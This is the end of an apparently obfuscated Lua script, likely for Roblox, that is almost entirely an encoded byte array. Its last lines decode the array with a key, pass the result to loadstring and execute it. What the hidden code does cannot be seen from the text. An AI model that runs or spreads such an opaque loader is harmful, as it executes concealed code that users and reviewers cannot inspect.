81,86,32,213,33,17,36,128,32,7,70,70,94,11,88,95,91,123,31,136,51,107,79,108,22,22,24,41,130,40,31,45,134,35,43,21,20,22,23,8,20,19,19,40,129,55,29,28,103,47,90,35,33,38,32,36,194,37,19,40,142,63,43,205,41,46,208,55,65,76,71,36,154,35,26,21,41,233,40,44,221,43,7,121,95,82,86,66,74,70,67,14,114,8,69,73,90,12,114,24,110,97,102,35,245,38,38,255,43,96,117,25,21,5,85,48,200,55,104,1,86,86,78,78,78,93,42,52,47,24,22,31,28,3,27,31,11,12,21,23,30,0,5,43,38,46,31,28,5,29,95,82,64,76,11,64,75,71,41,93,47,20,23,116,18,1,16,110,29,53,48,35,124,10,41,60,46,44,122,45,25,0,49,37,51,53,226,37,15,25,27,1,26,31,45,107,44,1,3,2,24,4,28,75,10,16,29,42,122,47,20,22,47,96,52,0,3,29,25,105,123,113,68,41,168,40,28,45,167,44,110,1,3,3,28,24,116,87,90,71,79,89,126,76,74,70,69,66,15,27,97,113,95,85,57,153,35,3,44,110,42,3,1,1,50,222,50,89,89,84,89,85,9,42,107,40,46,46,51,0,123,95,125,122,54,118,59,1,7,42,205,36,45,27,38,48,215,61,1,0,6,27,16,102,125,111,98,101,45,210,44,48,72,49,108,7,3,109,21,103,11,8,12,24,27,107,47,252,50,105,17,86,77,54,241,61,57,40,56,16,21,26,46,218,51,0,5,24,53,25,38,8,15,126,14,127,8,45,194,44,48,120,35,5,1,113,115,4,14,24,102,16,31,88,66,64,48,120,49,26,20,90,68,23,85,88,78,83,103,61,47,40,109,25,5,7,26,5,31,74,20,91,83,79,15,15,101,29,67,67,89,91,85,64,54,70,60,14,22,10,21,22,15,19,113,1,2,30,27,20,83,67,89,91,77,83,84,83,30,23,52,109,90,27,19,70,80,66,66,74,87,26,79,103,86,99,63,189,68,24,51,247,47,26,21,90,88,84,95,30,20,22,11,120,109,118,10,26,29,27,24,104,107,126,59,208,62,14,83,44,8,29,113,10,28,78,54,185,60,23,58,165,57,61,219,60,26,96,115,68,194,54,54,213,20,57,82,49,78,61,133,57,64,162,71,67,138,51,53,36,63,57,244,56,9,11,18,13,105,109,115,116,112,105,53,157,37,14,12,126,126,15,9,63,56,66,25,97,68,205,67,54,201,59,8,14,2,60,182,56,66,108,115,113,119,105,115,127,27,10,14,58,128,46,61,88,58,110,65,162,71,108,116,119,116,27,56,61,56,21,17,62,240,75,112,114,116,106,117,70,5,75,56,119,57,3,23,13,62,65,67,115,119,68,11,69,110,97,96,102,118,109,80,61,63,60,113,8,46,10,11,26,117,119,113,100,105,82,70,88,3,106,4,40,47,67,240,70,40,34,63,73,162,57,59,103,59,83,64,146,71,107,116,105,119,110,102,97,106,45,78,82,94,74,86,47,47,98,107,48,106,44,97,105,56,46,56,73,79,80,31,52,26,41,30,100,32,40,35,104,96,74,145,95,15,12,15,116,119,7,97,25,105,100,37,48,73,146,72,101,101,15,62,243,67,65,230,71,104,70,109,89,121,124,15,121,14,123,62,197,67,65,6,88,54,69,200,66,106,99,107,35,63,110,79,196,69,26,66,80,76,24,110,115,120,101,120,98,96,77,204,85,105,65,110,72,68,110,67,116,125,96,21,7,26,33,78,78,83,113,8,46,10,11,26,116,120,113,100,27,35,62,39,79,177,85,124,23,7,45,40,116,105,38,44,61,99,124,96,103,120,96,98,107,108,68,24,69,114,100,73,252,126,32,77,248,93,80,66,85,66,206,65,119,110,102,126,120,103,100,109,40,58,62,50,82,40,71,100,109,50,107,35,96,107,62,40,58,58,34,63,114,39,15,47,24,102,34,38,45,106,98,76,47,106,79,31,87,83,130,71,17,35,63,60,116,21,24,8,77,247,76,96,61,62,26,11,103,124,110,51,73,195,78,98,47,47,33,52,121,99,100,109,121,86,66,68,97,101,74,95,64,123,121,124,81,86,80,125,121,86,170,68,127,125,74,181,73,77,68,76,100,105,82,89,80,43,123,105,124,120,74,82,72,77,110,76,80,72,86,97,100,124,118,62,62,104,97,98,56,52,62,42,120,96,123,110,105,119,37,35,42,48,39,45,105,101,100,110,59,56,52,61,116,57,57,52,57,53,122,21,1,76,141,77,35,80,199,86,63,56,85,235,84,110,103,91,207,75,53,33,61,120,105,102,99,97,121,103,101,108,112,90,182,78,59,37,39,60,52,114,53,53,57,37,50,120,61,53,91,99,68,9,13,125,31,97,62,83,105,86,87,155,93,104,99,97,109,77,98,74,120,113,52,38,58,54,34,62,55,55,122,115,40,114,37,102,112,35,55,39,33,39,56,119,44,2,49,6,92,16,91,103,103,15,29,4,84,96,85,59,105,89,33,95,3,110,110,103,99,114,23,61,61,32,119,127,106,112,28,53,41,48,119,4,96,95,87,15,125,19,58,34,63,57,52,24,52,48,57,94,143,102,96,108,97,84,151,71,102,23,105,106,107,48,108,94,159,99,88,81,146,95,102,100,103,110,97,118,105,108,93,158,64,12,81,45,27,98,100,85,104,84,107,104,90,228,91,93,195,112,79,54,6,43,32,6,63,45,61,100,107,109,92,134,107,95,32,101,33,12,63,58,36,100,88,184,89,91,85,91,112,57,18,14,15,49,35,22,125,126,100,107,106,119,107,101,119,115,96,219,105,82,82,87,121,111,100,113,117,104,110,105,116,94,210,113,35,2,7,14,1,36,56,45,55,62,91,15,91,94,14,103,58,64,99,54,98,68,11,127,107,106,107,112,104,110,115,72,83,87,72,86,80,79,78,119,49,63,122,115,116,127,124,30,92,64,65,100,107,101,19,0,61,55,122,55,51,62,63,51,64,62,40,42,43,44,87,88,32,16,106,91,163,94,108,98,96,226,105,86,81,82,81,75,89,93,109,115,91,136,91,57,15,19,66,60,32,38,10,86,104,188,105,21,18,19,109,111,16,96,81,97,87,88,87,75,88,73,14,4,91,171,88,118,127,6,20,12,0,16,12,9,9,72,65,31,64,55,116,126,45,5,21,23,17,10,69,18,60,3,52,106,40,105,117,117,94,149,113,78,65,100,174,108,51,26,8,4,24,28,12,47,59,49,3,24,64,74,89,77,78,88,64,69,89,69,67,70,1,24,52,97,255,96,85,84,10,11,88,54,89,93,55,79,48,109,82,81,86,85,33,71,59,78,51,75,8,10,2,9,110,130,91,76,83,98,129,98,70,9,7,29,74,31,30,24,11,111,149,113,80,43,99,135,102,41,86,88,89,106,43,110,92,92,69,113,136,110,82,82,92,86,82,68,91,91,91,108,135,104,29,21,1,7,2,16,69,19,9,28,0,6,107,32,104,110,52,117,113,66,101,99,21,102,78,86,69,91,66,81,80,95,111,18,118,114,167,115,74,39,9,21,12,12,24,56,5,23,11,32,24,10,22,24,100,15,110,103,82,109,90,71,108,9,105,111,221,116,28,26,24,100,193,117,88,5,106,104,111,36,39,94,112,212,113,75,116,208,105,82,87,81,95,93,71,89,110,25,115,113,214,119,16,26,118,188,111,44,42,37,7,37,1,95,3,64,56,67,59,117,175,116,94,85,105,60,104,108,113,100,93,112,105,113,60,68,60,41,69,83,88,87,107,71,124,110,230,120,5,29,0,0,7,31,25,31,64,105,189,111,78,92,76,111,168,122,52,32,60,63,71,73,72,5,6,91,51,94,88,52,82,46,66,69,48,64,53,77,91,39,66,107,159,125,66,77,32,16,0,22,26,1,118,77,123,22,8,74,107,114,126,52,112,111,122,46,73,117,79,116,120,155,121,74,7,93,34,94,32,57,113,72,112,71,118,186,125,48,20,8,8,13,3,13,10,94,31,23,4,92,42,37,51,120,13,121,76,17,1,110,218,115,72,90,8,116,240,109,119,231,105,72,73,76,73,91,43,77,45,94,81,22,20,24,19,120,245,124,25,21,9,77,92,52,112,96,116,46,92,68,66,78,85,122,127,127,84,82,87,79,22,4,28,16,0,28,25,25,120,135,121,87,23,84,94,242,21,5,7,1,26,85,2,44,19,36,122,232,121,84,126,32,157,8,30,0,81,93,94,70,75,65,86,73,74,84,82,78,181,178,93,114,212,66,117,62,114,120,222,118,123,36,122,127,39,130,186,75,95,77,66,95,91,76,75,86,123,188,120,80,19,243,233,235,21,0,93,68,67,84,72,83,80,77,125,192,56,176,173,182,186,90,116,20,113,21,25,20,31,84,78,79,83,179,176,171,254,168,77,65,118,97,117,65,86,72,68,84,126,158,183,130,59,130,133,150,123,119,107,126,39,83,75,125,178,122,128,216,129,207,210,233,117,118,123,72,51,23,53,50,33,76,176,185,171,173,199,234,244,24,18,10,43,27,31,21,11,12,189,212,198,234,233,171,232,226,0,80,81,77,86,75,84,126,132,181,183,183,199,192,181,176,136,131,125,28,23,19,125,130,122,128,124,129,170,223,167,182,165,213,81,80,91,21,27,94,87,168,177,188,178,132,142,133,243,224,236,23,90,23,19,30,31,19,160,221,201,205,180,134,105,139,185,195,51,36,78,73,79,66,128,60,135,173,230,253,233,245,161,188,184,75,73,125,194,124,178,179,171,131,244,128,134,184,139,231,227,231,123,71,123,32,196,194,238,204,180,202,201,182,199,192,187,139,187,127,79,67,78,128,162,138,171,166,164,186,181,171,168,139,239,138,125,107,119,168,129,213,132,229,235,226,175,185,165,186,162,176,179,126,249,146,206,178,179,181,133,213,132,199,192,197,139,5,142,186,126,246,140,185,178,177,183,180,171,185,177,188,139,5,132,166,190,65,128,23,129,131,66,137,194,196,199,230,187,188,141,27,139,144,71,130,183,131,67,137,183,171,185,137,75,141,140,125,136,233,228,239,225,247,237,234,232,167,251,253,235,249,248,217,252,238,243,250,232,236,228,172,172,135,104,141,213,199,218,196,190,227,217,161,219,238,178,232,218,180,190,176,137,103,141,254,235,251,229,227,146,95,133,132,164,150,186,136,0,137,187,140,182,139,167,144,2,151,147,80,149,234,235,193,184,187,186,140,20,141,143,67,146,165,147,71,136,183,180,181,190,177,167,189,180,186,143,67,152,244,242,248,230,224,134,84,135,185,187,231,189,196,193,198,144,64,144,172,168,166,134,123,129,253,243,251,233,165,254,253,249,255,230,186,169,168,180,134,88,129,168,139,240,138,142,75,147,222,146,44,151,164,217,166,135,74,138,179,182,211,202,219,217,216,162,147,16,150,250,167,199,187,191,209,169,211,189,184,203,165,210,167,177,201,190,151,177,156,192,187,194,197,141,101,139,167,189,176,208,252,244,228,246,251,237,236,248,140,199,141,224,226,145,218,149,148,138,159,204,152,134,145,215,139,6,132,142,4,150,160,147,19,145,229,227,152,8,153,252,169,165,141,8,136,144,82,149,217,221,164,217,222,215,154,228,159,211,191,187,191,173,243,251,231,167,167,184,245,224,246,232,179,165,190,181,190,166,189,163,160,161,188,150,64,157,253,245,155,105,151,196,191,143,100,146,162,255,148,166,147,169,164,244,242,240,157,132,132,189,223,216,146,146,144,165,150,217,156,171,167,155,183,145,159,27,148,240,146,11,151,149,78,152,177,153,32,150,166,219,247,241,235,214,248,224,231,225,213,255,241,245,254,179,180,194,205,219,160,14,146,162,255,248,220,150,113,155,177,224,241,252,234,247,142,199,253,253,147,54,150,174,166,182,169,179,183,169,172,178,159,22,169,146,1,151,149,132,148,177,181,168,168,171,177,175,168,149,141,147,160,166,233,185,190,176,170,163,171,181,178,172,182,140,152,146,143,147,213,145,205,181,152,219,159,185,193,181,183,148,152,162,35,167,164,183,203,190,177,183,180,155,247,146,166,167,140,148,155,163,249,146,228,228,240,240,252,239,180,172,173,173,140,161,229,160,140,150,164,175,186,160,160,154,149,158,193,216,244,161,77,167,149,201,202,166,200,171,175,193,185,195,171,171,219,229,146,148,164,245,165,167,243,146,168,163,171,156,52,154,174,147,152,223,163,15,173,199,201,243,177,171,163,175,177,158,155,163,161,236,160,149,151,150,140,168,82,154,178,155,155,158,172,144,161,43,176,164,144,173,149,153,145,181,154,159,159,157,127,156,148,141,138,131,194,208,201,203,221,195,245,245,188,181,234,179,203,136,130,209,193,209,211,213,198,137,222,193,240,192,190,250,206,197,130,138,164,58,188,139,168,55,173,130,179,156,219,189,167,150,141,128,148,135,143,142,168,23,172,240,142,238,238,246,246,198,213,162,121,167,144,166,33,171,155,130,209,173,95,157,168,150,140,147,146,141,137,146,144,168,103,175,134,155,156,180,158,158,162,130,163,67,166,134,248,228,255,229,199,229,156,231,215,243,160,109,161,148,138,230,206,201,219,203,200,216,200,220,129,159,31,130,234,214,201,196,200,200,193,205,248,196,195,217,255,209,210,213,142,129,244,202,213,206,168,91,174,137,133,141,199,201,144,206,206,214,163,197,160,150,196,152,229,154,172,205,173,150,144,197,201,199,205,164,190,162,143,128,139,136,210,144,140,175,6,178,178,177,165,200,202,197,198,196,137,245,225,229,228,158,159,220,254,130,146,237,148,233,248,154,156,153,150,172,126,171,129,210,201,221,193,139,151,145,147,148,157,134,154,159,132,174,88,181,213,221,179,128,172,225,229,238,152,169,201,175,172,108,173,133,133,143,221,221,217,165,191,173,154,169,231,175,172,119,170,154,133,140,178,155,186,181,103,163,168,46,174,223,195,222,218,221,217,223,213,155,133,156,139,155,133,153,169,18,168,173,12,170,239,246,230,179,62,182,135,183,242,171,153,245,152,154,246,140,240,128,135,246,129,246,131,149,229,128,169,122,168,172,181,173,158,128,254,178,178,183,181,177,180,231,155,154,157,128,143,250,202,200,197,178,64,183,218,196,183,87,189,169,181,187,247,173,177,169,236,143,155,235,230,242,183,236,186,138,198,199,229,242,156,150,152,202,154,128,135,158,133,140,144,150,187,198,183,173,41,191,130,131,130,135,130,240,148,234,148,155,200,200,195,197,200,175,197,182,208,218,192,134,132,236,184,170,178,230,148,157,157,159,153,156,131,155,159,132,143,128,148,212,219,207,212,147,203,194,192,223,195,154,130,135,135,152,135,145,149,186,146,184,144,174,239,182,153,134,131,128,181,156,179,144,139,143,144,142,139,151,130,157,132,128,206,152,157,133,133,138,148,130,138,149,189,130,186,244,146,177,143,182,180,227,178,134,128,186,132,184,149,140,139,235,130,133,155,154,154,155,182,120,168,185,254,184,188,226,189,192,15,132,222,179,122,167,182,164,191,228,146,143,138,145,143,150,235,240,177,10,181,180,80,188,138,143,186,0,185,189,113,185,162,160,172,214,155,133,140,143,183,76,186,131,187,114,189,151,241,193,12,192,156,180,108,178,183,205,160,147,187,247,182,138,134,242,193,137,192,180,152,171,183,40,176,139,142,188,45,189,194,192,155,220,161,188,219,199,182,156,188,142,131,144,139,138,191,100,198,194,128,200,197,102,178,183,2,190,186,64,186,149,140,136,193,36,198,237,235,232,233,228,252,185,10,184,140,209,210,246,159,243,251,235,191,197,235,180,147,136,140,146,144,208,223,203,168,239,164,175,171,170,180,239,159,138,138,186,5,191,142,191,4,194,238,250,232,197,45,196,227,136,185,73,184,139,150,137,191,198,197,247,238,244,254,199,86,202,139,137,142,188,31,161,222,174,165,194,14,192,244,245,235,200,205,186,146,144,189,69,174,240,247,134,246,135,240,198,55,203,201,34,163,151,188,90,184,150,224,173,177,228,197,36,192,200,49,205,243,136,144,132,139,150,233,232,226,166,170,161,230,152,133,156,130,252,208,244,142,246,172,240,174,195,22,198,254,250,224,235,232,181,241,158,189,135,195,168,164,227,236,237,230,169,167,189,234,191,190,184,216,190,144,195,181,170,166,170,230,171,167,170,171,167,236,146,132,247,240,137,136,174,243,168,244,153,245,253,255,247,203,173,203,225,191,176,197,234,244,244,240,255,247,228,240,202,150,202,171,206,179,188,159,133,128,196,238,197,247,249,201,251,200,204,225,205,248,237,240,237,239,242,228,161,169,199,129,194,143,143,255,162,134,208,208,197,243,195,143,193,254,250,200,230,197,203,111,201,206,70,213,241,185,190,249,248,246,199,76,206,184,174,184,184,188,161,208,110,215,194,0,195,245,246,249,248,250,132,204,204,205,207,215,210,141,224,243,242,158,228,147,173,177,190,233,145,243,231,143,130,150,211,201,199,245,170,171,200,183,201,242,228,182,206,101,214,189,161,187,188,163,178,239,200,96,201,250,229,225,230,250,230,250,231,229,253,249,168,167,179,160,231,173,160,162,206,10,211,249,227,234,253,142,244,246,229,149,201,212,200,147,138,154,207,111,214,226,184,185,214,141,196,200,144,201,148,254,255,254,251,230,148,210,207,215,142,244,181,169,167,174,233,145,229,251,246,252,228,235,250,248,227,229,251,216,151,204,145,233,190,205,175,213,209,200,208,236,225,226,251,234,240,180,202,211,202,227,206,216,214,249,229,231,228,214,194,219,245,237,249,231,228,244,250,226,231,224,251,250,250,251,214,112,196,236,237,202,107,206,229,254,208,90,205,171,187,167,214,92,220,237,246,238,255,229,225,255,255,252,249,243,178,160,184,180,172,176,181,181,252,228,185,226,164,249,241,160,182,160,160,164,185,248,174,128,183,128,237,171,161,180,241,251,211,15,207,250,215,26,209,243,243,237,221,96,200,226,227,228,255,229,231,239,170,244,241,235,227,229,246,238,231,227,232,209,108,208,224,213,221,220,217,103,201,232,232,242,247,252,224,209,247,215,212,103,242,230,232,224,218,186,216,222,3,241,224,231,150,230,151,224,214,4,219,217,44,202,234,232,154,154,211,231,209,116,208,179,186,184,216,47,217,242,252,178,172,255,141,128,165,186,136,212,196,209,138,240,241,219,83,222,222,188,227,209,226,187,208,248,226,225,215,110,218,218,110,223,229,231,223,113,225,195,181,161,187,181,163,177,182,180,251,244,169,242,180,201,193,144,134,167,161,167,184,248,173,129,176,129,253,187,177,132,193,203,227,87,206,249,244,181,185,183,190,249,245,245,235,208,205,214,227,57,225,253,229,229,241,246,232,242,245,244,129,147,182,174,173,143,212,138,159,231,232,217,223,216,131,238,238,239,221,225,241,224,212,213,230,194,212,145,232,133,238,228,232,241,178,225,190,224,129,151,181,147,178,168,169,191,191,230,158,177,177,142,132,128,144,229,107,235,193,248,176,188,251,220,67,250,223,139,226,142,170,213,172,175,139,232,129,217,236,240,255,157,183,129,147,131,128,144,128,148,197,232,171,223,242,234,226,221,76,227,193,150,139,129,139,198,139,135,138,139,182,251,131,151,151,144,175,168,171,210,171,172,231,209,234,181,217,238,229,224,188,182,148,210,208,205,134,157,137,149,192,209,223,218,237,232,242,237,211,212,203,227,26,224,230,99,236,233,171,239,236,156,208,154,156,208,141,173,171,212,215,215,167,217,181,217,218,221,221,225,211,209,205,211,227,221,227,135,231,117,234,235,119,227,192,222,69,233,219,164,138,138,129,160,142,154,154,158,168,132,132,130,186,247,201,189,176,160,213,230,168,235,133,234,100,232,212,198,148,247,209,211,215,200,212,204,202,192,216,221,192,221,213,199,195,193,216,205,202,195,130,144,136,132,156,128,133,133,204,197,155,220,154,200,194,145,129,145,147,149,134,201,158,176,135,176,238,70,245,216,201,189,164,177,175,174,232,174,233,135,128,221,177,220,198,170,208,189,213,209,161,163,212,223,203,183,192,207,136,131,159,158,128,209,202,204,212,200,231,190,234,234,195,253,221,216,171,197,178,198,214,185,229,164,245,218,219,218,223,218,168,238,173,244,131,129,155,157,130,145,196,206,201,133,153,204,237,1,234,171,241,225,251,169,221,220,212,211,196,219,234,69,232,212,221,240,71,241,142,216,196,207,208,203,192,193,216,217,218,196,193,239,231,242,192,198,221,219,217,231,9,249,234,37,169,237,39,245,193,199,196,223,214,197,246,89,225,232,229,233,176,237,226,236,173,216,222,243,76,240,216,155,248,34,236,194,216,217,193,223,198,219,192,242,225,243,246,58,243,205,220,216,235,33,233,238,195,246,241,4,245,244,44,245,247,236,252,234,56,239,221,238,14,243,241,193,251,150,141,246,113,251,164,210,216,218,221,193,219,221,241,5,240,153,148,130,159,163,249,103,252,182,196,197,223,220,200,216,242,138,243,245,95,226,249,28,217,252,47,233,238,181,254,241,5,233,204,192,246,1,241,193,207,251,9,235,198,222,200,218,195,203,221,220,216,217,167,170,190,251,120,254,221,130,131,185,174,192,202,221,141,223,216,159,143,149,159,137,151,129,129,208,217,134,223,159,220,214,133,157,141,143,142,147,222,139,180,155,172,210,150,154,145,214,222,248,103,232,201,206,205,202,201,170,240,108,247,134,134,158,158,158,141,216,210,252,137,253,201,44,194,216,222,194,192,197,218,247,13,254,201,213,210,254,241,3,41,217,192,243,10,246,246,253,251,132,214,211,207,207,213,51,50,2,122,240,244,154,203,149,153,151,158,251,145,254,201,206,44,54,51,219,223,150,159,131,203,203,212,151,252,126,251,215,50,49,46,50,218,223,196,223,222,209,217,142,147,152,144,223,108,110,97,98,104,212,170,186,161,201,200,179,202,204,180,254,69,3,49,59,57,45,245,230,244,183,149,179,202,181,180,146,255,253,2,53,42,95,39,182,158,150,138,155,152,136,152,140,221,93,47,42,75,113,104,103,152,152,145,157,168,148,147,137,174,158,115,118,3,36,6,86,104,132,145,249,84,255,222,160,254,173,10,72,77,76,75,52,6,79,251,201,179,178,163,206,207,207,0,87,7,3,98,14,43,7,109,253,200,150,202,179,207,255,101,2,59,42,42,72,103,96,102,96,141,143,159,153,221,151,153,32,41,42,35,107,105,115,40,125,120,143,158,252,86,241,181,73,109,77,51,4,7,5,78,8,94,9,201,202,207,195,255,223,7,96,123,107,119,46,54,57,48,50,50,215,205,207,205,214,32,103,109,96,5,65,2,57,55,56,11,230,242,185,189,176,73,49,77,50,104,74,55,7,126,9,61,63,13,194,243,211,49,1,59,5,4,250,5,55,57,56,59,59,12,204,254,255,39,2,2,173,0,51,40,83,109,113,126,11,207,14,93,186,255,26,2,50,111,104,6,123,11,48,34,112,36,37,58,62,207,41,46,48,42,40,5,128,1,100,122,98,98,107,122,39,39,51,1,72,0,40,104,103,115,96,82,40,109,96,98,97,125,50,93,41,52,50,94,36,55,42,84,35,39,61,60,57,114,60,39,56,46,43,44,52,53,49,8,54,14,56,61,39,33,62,17,72,13,50,4,87,1,117,8,91,12,58,63,63,34,15,119,17,59,35,98,112,104,100,124,96,101,101,44,37,122,35,123,56,50,97,102,112,112,117,102,41,126,80,103,80,14,252,21,56,58,76,83,80,76,79,7,182,10,102,103,12,182,12,16,101,17,76,38,39,53,50,49,77,43,87,39,46,13,235,11,50,56,58,34,35,58,50,7,151,10,59,50,58,112,14,94,37,39,39,87,81,38,33,6,86,12,9,215,10,36,38,61,35,38,60,35,20,139,87,118,105,108,9,148,8,59,52,34,56,41,18,249,23,61,37,47,49,39,59,35,34,34,35,81,92,84,17,194,16,36,121,122,94,70,59,51,35,119,37,54,55,61,35,38,19,122,22,22,253,1,48,82,10,70,10,80,39,33,38,36,63,20,17,21,62,101,53,40,59,57,32,37,61,54,59,34,18,79,23,39,39,24,78,30,27,210,22,13,78,12,16,203,20,78,60,74,90,65,81,86,85,84,61,66,98,70,32,88,91,76,39,21,45,20,54,55,58,27,142,28,56,59,36,16,238,23,20,132,10,101,107,113,115,125,104,29,158,13,56,32,33,62,33,20,145,21,38,47,54,27,131,30,53,63,55,57,61,32,33,39,21,230,19,24,142,25,27,237,30,99,14,201,15,126,19,92,29,34,34,52,40,51,48,45,49,30,253,12,56,36,33,19,148,22,62,56,124,116,127,60,116,120,63,8,56,50,48,49,41,40,39,23,10,26,110,115,121,112,63,76,78,114,115,127,52,74,92,94,41,41,85,84,28,240,29,86,16,126,35,36,33,40,116,126,108,42,40,53,126,101,113,109,8,19,26,39,35,45,57,39,33,46,25,95,26,121,113,31,20,41,102,96,19,226,22,39,94,24,33,25,27,47,30,40,34,78,75,79,36,14,31,36,23,243,26,83,42,45,44,30,81,36,22,31,35,15,27,21,157,28,25,149,31,28,136,21,46,30,19,34,177,53,21,121,122,123,24,143,25,42,83,84,115,105,33,65,39,28,37,176,26,32,42,44,46,55,42,36,30,139,50,33,17,32,72,38,94,20,116,25,28,24,44,84,30,211,35,24,34,186,43,73,74,104,88,41,25,74,24,42,46,31,184,37,34,12,53,37,194,35,40,249,31,124,110,114,126,106,118,79,79,3,87,81,73,87,124,91,120,121,112,117,115,121,55,9,126,110,117,36,190,37,110,24,99,118,42,112,66,44,38,24,28,10,0,6,7,27,26,25,0,42,208,1,85,82,114,32,222,33,35,83,34,23,39,239,37,31,31,46,42,37,50,43,18,33,234,37,36,100,35,40,105,46,43,19,17,29,205,27,76,104,78,35,241,38,38,72,43,30,24,43,18,17,47,51,32,87,33,35,29,45,5,92,85,20,23,27,44,86,26,30,186,35,110,34,132,38,38,83,43,41,137,40,21,16,64,119,115,32,64,43,3,74,74,82,39,44,44,95,94,88,75,47,48,40,102,118,106,109,21,38,69,43,69,26,116,31,27,117,13,64,17,20,103,17,102,19,5,117,1,42,197,47,45,54,44,1,16,110,34,34,39,37,33,43,118,25,27,26,1,12,123,85,73,85,0,10,4,74,84,39,64,45,42,52,60,118,47,47,55,111,31,11,123,118,98,39,124,42,26,71,64,100,46,170,51,25,73,34,212,34,71,73,76,1,28,29,0,27,24,6,28,25,11,24,19,13,9,38,246,46,91,89,68,68,72,91,24,9,5,5,24,22,37,60,36,0,26,18,27,5,2,46,37,52,0,4,7,53,3,44,39,223,44,24,18,0,20,25,6,77,29,95,82,64,93,11,64,75,70,42,56,40,30,25,1,48,122,34,7,2,5,54,109,34,27,31,42,77,47,4,0,30,49,189,60,52,94,53,55,89,44,29,26,7,20,27,46,113,60,49,179,48,7,4,55,72,33,41,132,47,25,25,2,26,4,49,156,48,12,0,27,5,0,40,81,37,27,20,46,87,52,8,11,31,6,4,54,84,43,8,25,29,0,29,29,22,47,126,60,3,52,138,53,55,60,58,19,6,116,107,121,103,102,48,163,49,95,88,5,105,4,14,98,25,116,28,27,106,26,115,4,16,110,28,53,44,38,10,11,10,15,29,105,15,115,3,19,94,51,232,48,20,30,24,86,72,27,60,194,40,117,47,35,57,111,27,0,4,26,9,16,17,10,60,240,33,31,30,6,29,5,51,250,54,54,132,52,13,9,59,143,62,83,3,7,8,30,27,28,7,5,3,17,22,8,59,224,62,8,30,2,1,0,27,26,28,22,82,86,93,26,82,90,29,22,23,91,73,65,87,27,5,28,11,10,26,74,78,78,84,80,88,98,48,44,49,71,92,80,88,23,84,86,89,90,80,29,97,117,9,0,125,3,5,124,90,55,201,58,101,9,11,9,3,63,54,74,3,1,4,12,12,26,1,0,58,117,54,12,0,13,64,127,76,118,112,123,4,121,6,56,122,57,114,12,61,0,67,116,66,125,63,52,243,50,55,191,49,101,119,106,114,113,83,112,45,11,115,3,52,51,52,103,10,10,11,60,185,56,63,226,68,97,97,102,9,8,54,130,59,57,173,52,81,113,63,115,66,13,47,13,41,53,161,52,15,57,173,55,9,15,11,7,117,109,115,119,112,70,208,49,94,86,72,59,180,57,62,253,67,14,115,67,200,70,70,105,52,10,13,3,1,13,18,18,113,97,38,44,68,237,76,117,91,8,9,115,59,62,57,62,217,66,123,126,68,116,87,71,170,60,57,156,41,6,121,87,76,35,46,44,45,33,38,50,96,96,57,255,41,1,83,87,83,64,133,68,55,61,53,35,111,121,96,4,7,25,79,74,77,41,47,37,97,68,138,87,71,211,74,123,58,186,63,61,235,60,31,115,122,115,69,150,75,124,112,114,103,9,13,9,62,241,70,51,39,51,33,36,50,103,61,39,62,76,103,62,74,77,53,36,66,167,65,69,216,64,72,213,73,75,138,63,12,15,63,219,65,116,106,8,41,50,59,44,8,62,56,57,82,80,14,3,45,43,32,47,127,5,71,227,77,56,56,44,60,74,107,50,32,33,40,68,207,69,110,72,232,76,107,34,34,58,63,16,68,66,218,85,10,42,14,121,121,5,123,76,219,77,124,63,214,77,113,122,118,118,127,100,120,126,122,76,213,72,56,56,41,45,39,99,34,36,42,52,45,105,46,36,77,153,71,20,18,115,115,114,40,12,15,119,36,73,159,72,121,112,126,79,147,84,105,67,238,65,70,70,75,120,3,39,5,2,78,228,83,105,123,25,97,68,232,87,101,21,74,228,71,34,62,79,254,95,99,110,126,68,50,69,71,239,76,74,181,72,77,143,74,114,112,113,84,82,65,70,249,88,73,41,72,5,77,141,76,31,61,62,26,84,134,70,113,72,139,70,121,123,121,121,123,124,99,96,97,84,151,90,70,224,75,120,123,123,125,126,35,31,97,82,149,87,109,86,128,64,72,193,79,117,124,77,201,68,36,48,33,56,14,116,51,34,46,44,56,105,17,101,110,41,37,63,49,39,61,58,56,119,111,97,22,20,4,112,32,38,60,81,251,85,100,107,86,241,74,72,234,73,123,32,124,78,16,84,107,83,246,89,98,101,110,104,122,102,121,124,77,236,72,80,34,84,83,251,86,86,180,85,30,9,39,3,124,7,6,97,14,96,106,100,85,136,91,105,117,107,74,147,74,18,16,34,37,13,55,49,37,86,213,93,89,179,95,98,76,197,72,79,186,84,82,217,69,102,24,52,104,107,91,173,79,77,165,76,105,99,82,223,88,96,99,99,97,106,118,98,104,77,197,73,34,52,34,54,53,33,118,34,54,45,90,140,95,41,63,59,42,80,157,91,2,24,19,47,49,45,103,91,84,94,110,126,79,131,82,27,63,29,10,101,102,107,116,62,36,56,61,119,123,96,81,154,85,125,125,127}
local _DDOOO1OOIO_321=_XDIlIlOO_319(_CDI0101O0_320,152)
local _SC101l10OOOO0_322=_LZDl1lIIlOl_318(_DDOOO1OOIO_321)
local _F,_E=loadstring(_SC101l10OOOO0_322)
if _F then _F()else warn(_E)end
